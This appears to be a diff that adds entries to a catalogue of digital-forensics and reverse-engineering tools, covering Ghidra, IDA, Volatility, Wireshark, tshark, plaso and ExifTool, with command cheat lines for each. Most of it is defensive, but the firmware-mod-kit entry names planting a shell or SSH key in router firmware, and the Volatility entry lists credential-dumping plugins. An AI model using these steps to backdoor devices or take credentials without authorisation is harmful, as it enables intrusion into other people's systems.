+    library-function signatures, and headless scripting - but with no Hex-Rays
+    decompiler. Pair it with Ghidra or Cutter when you need decompiled C.
+    • ida64 target  -> auto-analysis, then G goto / X xrefs / N rename / ; comment / Space graph<->text
+    • strings Shift+F12, imports/exports tabs, FLIRT signatures to name library funcs
+    • idat64 -A -S"script.idc" target   for headless / scripted analysis; remote debug via dbgsrv/
+    • no Hex-Rays on the free tier - pair with forensic_ghidra or forensic_cutter for decompiled C
+forensic_firmware_mod_kit        - firmware-mod-kit - unpack / rebuild router & IoT firmware
+    firmware-mod-kit unpacks a router or IoT firmware image into an editable
+    root filesystem, then repacks the modified version into a flashable image.
+    It bundles binwalk and the squashfs/cramfs/jffs2 tooling including vendor
+    LZMA variants. Use it to read a device's filesystem offline or to plant a
+    shell or SSH key.
+    • ./extract-firmware.sh image.bin  ->  fmk/rootfs (editable), fmk/image_parts, fmk/logs
+    • ./build-firmware.sh fmk/ -nopad   repacks the modified rootfs into a flashable image
+    • bundles binwalk + squashfs/cramfs/jffs2 tooling incl. vendor LZMA squashfs variants
+    • use to plant a shell / SSH key / modified web UI in an image, or just to read the filesystem offline
+forensic_deepbluecli             - DeepBlueCLI - threat hunting in Windows event logs
+    DeepBlueCLI hunts threats in Windows event logs (live or exported EVTX):
+    it flags password spraying and brute force, suspicious service and user
+    creation, PowerShell downgrade and encoded/long command lines,
+    obfuscation, Mimikatz indicators and audit-log clearing. Output is objects
+    for the report. Script-block logging helps a lot.
+    • .\DeepBlue.ps1 -log security          or   .\DeepBlue.ps1 .\exported.evtx
+    • flags: password spraying / brute force, suspicious service + user creation, PowerShell downgrade, long/encoded command lines, obfuscation, Mimikatz, audit-log clearing
+    • needs Security + System + PowerShell operational logs (script-block logging 4104 helps a lot)
+    • output is objects - pipe to Format-List or Export-Csv for the report
+forensic_exiftool                - ExifTool - file metadata extraction
+    ExifTool reads, writes and strips file metadata across images, PDFs and
+    Office documents - GPS coordinates, timestamps, camera/software, author.
+    Use it to extract intelligence from files you obtain, or to check
+    documents for leaks before publishing (exiftool -all=). Batch and CSV
+    output for bulk work.
+    • exiftool file.jpg                   read all tags ;  exiftool -G -a -s file   with groups / duplicates / tag IDs
+    • exiftool -gps:all -createdate -make -model -software -author *.jpg *.pdf *.docx
+    • strip everything: exiftool -all= -overwrite_original file   (data-leak check before publishing docs)
+    • batch/recurse: exiftool -r -csv -DateTimeOriginal -GPSLatitude -GPSLongitude ./photos > meta.csv
+forensic_ghidra                  - Ghidra - NSA software reverse-engineering suite
+    Ghidra is the NSA's free reverse-engineering suite. Import a binary, run
+    auto-analysis, and work from the decompiler pane - with struct/enum
+    recovery, version tracking and bin-diff, Java/Python scripting, and a
+    headless mode for batch jobs. The default free decompiler for serious RE.
+    • New project -> import binary -> "Analyze" (accept defaults) ; the Decompiler pane (right) is the payoff
+    • keys: L rename, Ctrl-L retype, ; comment, G goto, X xrefs ; Window > Defined Strings / Symbol Tree / Function Graph
+    • headless: analyzeHeadless proj MyProj -import bin -postScript Script.java   for batch / CI
+    • struct + enum recovery, version tracking / bin-diff, Java-Python scripting, shared multi-user server
+forensic_kibana                  - Kibana / ELK - log search and analysis
+    Kibana is the search and analysis front end for an Elasticsearch/ELK log
+    store. Use KQL in Discover to filter events (process, user, host, command
+    line), set the time range, save searches, and build visualisations,
+    dashboards and alerts. The investigator's console when logs are
+    centralised in ELK.
+    • Discover tab: KQL like  event.category:"process" and process.name:"powershell.exe" and process.args:*enc*
+    • set the time range first ; add fields as columns ; Save a search ; build Lens / TSVB visualisations and dashboards
+    • pivot: click a value -> Filter for/out ; use "Alerts" for detections ; ES|QL for aggregations
+    • when investigating: narrow by host.name / user.name / source.ip, then widen the time window around a hit
+forensic_log2timeline            - plaso / log2timeline - super-timeline creation
+    plaso / log2timeline builds a 'super timeline' from a disk image or set of
+    files - normalising $MFT, registry, EVTX, browser, prefetch, LNK, SRUM and
+    shell-item timestamps into one sortable set. psort filters and exports
+    (CSV, or to Timesketch for collaborative analysis).
+    • log2timeline.py --storage-file out.plaso image.E01        (or a mounted dir / single file)
+    • psort.py -o l2tcsv -w timeline.csv out.plaso "date > '2026-01-01'"        filter + export
+    • parsers for $MFT, registry, EVTX, browser, prefetch, LNK, SRUM, shell items and more; --parsers to trim
+    • push to Timesketch (psort -o timesketch) for collaborative analysis of the timeline
+forensic_malware_analysis        - static / dynamic malware-analysis workflow
+    A workflow rather than one tool: an isolated snapshotted VM with a fake
+    network, static triage (hashes, VT, capa, packer detection, strings, PE
+    imports, FLOSS), dynamic analysis (Procmon + Regshot + Wireshark/inetsim),
+    then a debugger or disassembler for the hard parts - recording IOCs
+    throughout.
+    • lab: isolated VM with snapshots, fake network (inetsim / fakedns), no shared folders; never analyse on a live host
+    • triage: sha256 + VT/capa, file / DIE for packer, strings -e l/-e b, PE imports (pestudio / rabin2 -i), floss for stacked strings
+    • dynamic: Procmon + Regshot + Wireshark/inetsim ; run, observe files/keys/network/persistence ; then debugger/disassembler for the hard parts
+    • record IOCs: hashes, C2 domains/IPs/URIs, mutexes, filenames, registry keys, YARA - for detection and the report
+forensic_sigcheck                - Sysinternals Sigcheck - signature / VT verification
+    Sysinternals Sigcheck verifies digital signatures and versions of
+    executables, and can submit hashes to VirusTotal. Recurse a system
+    directory showing only unsigned binaries for a quick 'what does not
+    belong' pass after a suspected compromise.
+    • sigcheck.exe -e -u -s C:\Windows\System32          recurse, show unsigned executables only
+    • -a full version/signing info ; -h hashes (MD5/SHA1/SHA256/IMP) ; -i cert chain / catalog
+    • sigcheck.exe -vt -v <file>        submit the hash to VirusTotal (add -vrs to only show detections)
+    • quick "what doesn't belong" pass over system dirs after suspected compromise
+forensic_sqlite3                 - sqlite3 - inspect SQLite evidence databases
+    The sqlite3 CLI for inspecting the SQLite databases that hold browser
+    history, chat logs and app data. List tables and schema, run SELECTs,
+    export CSV. Note that deleted rows may survive in freelist pages and the
+    -wal file - copy those too - and that Chrome timestamps need conversion.
+    • sqlite3 History        then  .tables   .schema urls   SELECT url,last_visit_time FROM urls ORDER BY 2 DESC LIMIT 20;
+    • dump/export: .headers on ; .mode csv ; .output out.csv ; SELECT ... ;   (.dump for full SQL)
+    • deleted rows may survive in freelist pages and the -wal / -journal file - copy those alongside the DB; tools like undark / sqlparse recover them
+    • Chrome time = microseconds since 1601: datetime(ts/1000000-11644473600,'unixepoch')
+forensic_srum_dump               - srum-dump - parse Windows SRUM usage database
+    srum-dump parses the Windows SRUM database (SRUDB.dat) into a spreadsheet
+    showing the last ~30-60 days of per-application resource and network usage
+    - bytes sent and received per app and interface. Strong evidence for
+    exfiltration and beacon timelines; corroborate with Prefetch, Amcache and
+    event logs.
+    • srum_dump.exe -i C:\Windows\System32\SRU\SRUDB.dat -r SRUM_TEMPLATE.xlsx -o out.xlsx   (also needs the SOFTWARE hive: -e)
+    • sheets: App Resource Usage (CPU, bytes r/w), Network Usage (bytes sent/received per app + interface + profile), Network Connections, Energy
+    • last ~30-60 days of "what ran and how much data it moved" - strong evidence for exfil / beacon timelines
+    • SRUM flushes hourly - combine with Prefetch, Amcache and event logs to corroborate
+forensic_strings                 - strings - pull ASCII / Unicode text from binaries
+    strings pulls printable ASCII and Unicode text from a binary - URLs, IPs,
+    paths, commands, registry keys, mutex names, build strings. Use -e l for
+    the 16-bit little-endian strings common in Windows malware. For packed or
+    obfuscated samples use FLOSS, which also deobfuscates stacked and encoded
+    strings.
+    • strings -a -n 8 file            all sections, min length 8 (cuts noise)
+    • strings -e l file  (16-bit little-endian / UTF-16, common in Windows malware) ; -e b big-endian ; -t x show hex offsets
+    • first pass for URLs, IPs, file paths, commands, registry keys, mutex names, error messages, build strings
+    • for packed / obfuscated binaries use FLOSS (deobfuscates stacked & encoded strings) instead
+forensic_tshark                  - tshark - CLI pcap analysis and statistics
+    tshark is Wireshark's command-line engine: apply display filters and
+    extract specific fields for scripting, run statistics (conversations,
+    protocol hierarchy, IO, follow-stream), capture with ring buffers, and
+    export transferred objects. The tool for pcap analysis in a pipeline or
+    over SSH.
+    • tshark -r cap.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri -E header=y
+    • stats: -z conv,tcp  -z io,phs  -z endpoints,ip  -z http,tree  -z follow,tcp,ascii,0
+    • capture: tshark -i eth0 -f 'tcp port 80' -w out.pcap -a duration:60 ; -b filesize:100000 ring buffer
+    • export objects: tshark -r cap.pcap --export-objects http,./out ; decode-as: -d tcp.port==8443,ssl
+forensic_volatility              - Volatility - memory-image forensics
+    Volatility analyses a RAM image: list processes (pslist/psscan/pstree),
+    command lines, DLLs and injected code (malfind), network connections, and
+    extract credential material (hashdump, lsadump, cachedump) and registry
+    hives. Volatility 3 auto-detects symbols; Volatility 2 needs a profile.
+    • vol3 -f mem.raw windows.info        confirm it parses (Vol3 auto-detects symbols; no profile needed)
+    • processes: windows.pslist / psscan / pstree ; windows.cmdline ; windows.dlllist ; windows.malfind (injected code)
+    • network: windows.netscan / netstat ; creds: windows.hashdump / lsadump / cachedump ; registry: windows.registry.hivelist / printkey
+    • dump: windows.dumpfiles --pid <n> ; windows.memmap --dump --pid <n> ; Vol2: vol.py -f mem --profile=Win7SP1x64 <plugin>
+forensic_wireshark               - Wireshark - GUI packet analysis
+    Wireshark is the GUI packet analyser: powerful display filters,
+    Follow-Stream to read a conversation, Statistics for conversations /
+    protocol-hierarchy / IO graphs, Export Objects to carve transferred files,
+    and TLS decryption with a key-log file. The deep-dive tool once tshark or
+    NetworkMiner has pointed you at the interesting traffic.
+    • display filters: ip.addr==10.0.0.5 && tcp.port==445 ; http.request ; dns ; tcp.flags.syn==1 && tcp.flags.ack==0 ; frame contains "password"
+    • right-click a packet -> Follow > TCP/HTTP/TLS Stream ; Statistics > Conversations / Protocol Hierarchy / IO Graph ; Expert Info
+    • File > Export Objects > HTTP/SMB/TFTP to carve transferred files ; decrypt TLS via Preferences > Protocols > TLS > (Pre)-Master-Secret log
+    • Analyze > Expert Info for retransmits / resets ; coloring rules and profiles per investigation type
+
+###############################################################################################
